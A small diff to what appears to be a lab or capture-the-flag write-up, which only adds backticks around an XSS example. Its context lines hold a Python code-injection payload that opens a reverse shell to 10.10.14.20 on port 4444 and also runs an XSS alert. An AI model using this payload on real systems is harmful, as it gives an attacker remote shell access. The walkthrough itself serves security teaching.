@@ -177,7 +177,7 @@ subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0
 ```
 
 
-For this, we need to create a simple XSS payload at first like <script>alert()</script> and append in the payload above.
+For this, we need to create a simple XSS payload at first like `<script>alert()</script>` and append in the payload above.
 
 ```bash
 'hello=exec("""\nimport socket\nimport subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.10.14.20",4444))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\nprint(%22%3Cscript%3Ealert%28XSS%29%3C%2Fscript%3E%22)""")'
